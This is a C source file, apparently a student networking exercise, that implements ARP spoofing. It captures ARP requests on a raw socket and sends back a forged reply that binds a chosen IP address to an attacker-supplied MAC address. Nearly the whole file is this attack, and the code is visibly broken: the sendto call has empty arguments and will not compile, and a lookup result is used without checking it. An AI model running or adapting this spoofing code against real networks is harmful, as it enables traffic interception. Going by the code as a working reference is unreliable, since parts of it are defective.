/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ft_malcolm.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: cclaude <cclaude@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/09/01 18:43:59 by cclaude           #+#    #+#             */
/*   Updated: 2021/09/08 14:10:41 by cclaude          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_malcolm.h"

void print_arp (struct ethhdr *eth, struct ether_arp *arp)
{
	printf("> Full breakdown :\n");
	printf("> eth->h_dest          %.6s            (%02X:%02X:%02X:%02X:%02X:%02X)\n", eth->h_dest, eth->h_dest[0], eth->h_dest[1], eth->h_dest[2], eth->h_dest[3], eth->h_dest[4], eth->h_dest[5]);
	printf("> eth->h_source        %.6s            (%02X:%02X:%02X:%02X:%02X:%02X)\n", eth->h_source, eth->h_source[0], eth->h_source[1], eth->h_source[2], eth->h_source[3], eth->h_source[4], eth->h_source[5]);
	printf("> eth->h_proto         %04X            (0806 for ARP)\n", ntohs(eth->h_proto));
	printf("> arp->ea_hdr.ar_hrd   %-10u      (1 for Ethernet)\n", ntohs(arp->ea_hdr.ar_hrd));
	printf("> arp->ea_hdr.ar_pro   %-10u      (2048 for IP)\n", ntohs(arp->ea_hdr.ar_pro));
	printf("> arp->ea_hdr.ar_hln   %-10u      (6 for MAC)\n", arp->ea_hdr.ar_hln);
	printf("> arp->ea_hdr.ar_pln   %-10u      (4 for IPv4)\n", arp->ea_hdr.ar_pln);
	printf("> arp->ea_hdr.ar_op    %-10u      (1 for request, 2 for reply)\n", ntohs(arp->ea_hdr.ar_op));
	printf("> arp->arp_sha         %.6s            (%02X:%02X:%02X:%02X:%02X:%02X)\n", arp->arp_sha, arp->arp_sha[0], arp->arp_sha[1], arp->arp_sha[2], arp->arp_sha[3], arp->arp_sha[4], arp->arp_sha[5]);
	printf("> arp->arp_spa         %-10u      (%d.%d.%d.%d)\n", *(unsigned int *)arp->arp_spa, arp->arp_spa[0], arp->arp_spa[1], arp->arp_spa[2], arp->arp_spa[3]);
	printf("> arp->arp_tha         %.6s            (%02X:%02X:%02X:%02X:%02X:%02X)\n", arp->arp_tha, arp->arp_tha[0], arp->arp_tha[1], arp->arp_tha[2], arp->arp_tha[3], arp->arp_tha[4], arp->arp_tha[5]);
	printf("> arp->arp_tpa         %-10u      (%d.%d.%d.%d)\n\n", *(unsigned int *)arp->arp_tpa, arp->arp_tpa[0], arp->arp_tpa[1], arp->arp_tpa[2], arp->arp_tpa[3]);
}

int hex_value (char c)
{
	if (c >= 'a')
		return (c - 'W');
	return (c - '0');
}

void fill_mac (unsigned char *addr, char *mac)
{
	for (int i = 0, j = 0 ; i < 6 ; i++, j += 3)
		addr[i] = 16 * hex_value(mac[j]) + hex_value(mac[j + 1]);
}

int main (int ac, char **av)
{
	if (error_check(ac, av))
		return (1);

	int packet_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	printf("Connected on socket : %d\n\n", packet_socket);

	struct hostent *ent = gethostbyname(av[1]);
	printf("Hostent contents\nName : %s\n", ent->h_name);
	for (int i = 0 ; ent->h_aliases[i] ; i++)
		printf("Alias : %s\n", ent->h_aliases[i]);
	printf("Address type : %d\n", ent->h_addrtype);
	printf("Address length : %d\n", ent->h_length);
	for (int i = 0 ; ent->h_addr_list[i] ; i++)
		printf("Address list : %s\n", ent->h_addr_list[i]);
	printf("\n");

	struct ifaddrs *ifaddr;
	getifaddrs(&ifaddr);
	for (struct ifaddrs *ifa = ifaddr ; ifa != NULL ; ifa = ifa->ifa_next)
		printf("Interface : %s, %d (PF_INET = 2, PF_INET6 = 10, PF_PACKET = 17...)\n", ifa->ifa_name, ifa->ifa_addr->sa_family);
	freeifaddrs(ifaddr);
	// printf("setsockopt ret : %d\n", setsockopt(packet_socket, SOL_SOCKET, SO_BINDTODEVICE, "br-04e35d30a215", 15));
	printf("\n");

	while (1)
	{
		char packet[1000] = {0};
		// printf("IP found isn't target (%s), still waiting\n\n", av[3]);
		// int ret = recvfrom(packet_socket, buf, 1000, 0, (struct sockaddr *)&saddr, &addrlen);
		int packet_len = recvfrom(packet_socket, packet, 1000, 0, NULL, NULL);

		if (packet_len == ETHER_HDR_LEN + ETHER_ARP_LEN)
		{
			struct ethhdr *eth = (struct ethhdr *)packet;
			struct ether_arp *arp = (struct ether_arp *)(packet + ETHER_HDR_LEN);
			if (ntohs(eth->h_proto) == ETH_P_ARP && ntohs(arp->ea_hdr.ar_op) == ARPOP_REQUEST)
			{
				printf("Received ARP request !\n\n");
				print_arp(eth, arp);

				arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
				*(unsigned int *)arp->arp_spa = inet_addr(av[1]);
				fill_mac(eth->h_source, av[2]);
				fill_mac(arp->arp_sha, av[2]);
				*(unsigned int *)arp->arp_tpa = inet_addr(av[3]);
				fill_mac(eth->h_dest, av[4]);
				fill_mac(arp->arp_tha, av[4]);

				print_arp(eth, arp);

				packet_len = sendto(packet_socket, packet, ETHER_HDR_LEN + ETHER_ARP_LEN, 0, , );
				printf("Sent : %d\n\n", packet_len);
				if (packet_len == -1)
					perror("Oops ");

				break ;
			}
		}
	}

	close(packet_socket);

	return (0);
}

// struct	ether_arp {
// 	struct	arphdr ea_hdr;		/* fixed-size header */
// 		=> struct arphdr
//
//     		unsigned short int ar_hrd;		/* Format of hardware address.  */ => 1, ARPHRD_ETHER (unchanged)
//     		unsigned short int ar_pro;		/* Format of protocol address.  */ => 2048 (unchanged)
//     		unsigned char ar_hln;		/* Length of hardware address.  */ => 6 (unchanged)
//     		unsigned char ar_pln;		/* Length of protocol address.  */ => 4 (unchanged)
//     		unsigned short int ar_op;		/* ARP opcode (command).  */ => 2, ARPOP_REPLY (CHANGED, don't forget htons)
//   };
// 	uint8_t arp_sha[ETH_ALEN];	/* sender hardware address */ => arp_tha ?
// 	uint8_t arp_spa[4];		/* sender protocol address */ => arp_spa ?
// 	uint8_t arp_tha[ETH_ALEN];	/* target hardware address */
// 	uint8_t arp_tpa[4];		/* target protocol address */
// };


// struct arphdr
//
//     unsigned short int ar_hrd;		/* Format of hardware address.  */ => 1, ARPHRD_ETHER (unchanged)
//     unsigned short int ar_pro;		/* Format of protocol address.  */ => 2048 (unchanged)
//     unsigned char ar_hln;		/* Length of hardware address.  */ => 6 (unchanged)
//     unsigned char ar_pln;		/* Length of protocol address.  */ => 4 (unchanged)
//     unsigned short int ar_op;		/* ARP opcode (command).  */ => 2, ARPOP_REPLY (CHANGED, don't forget htons)
//   };
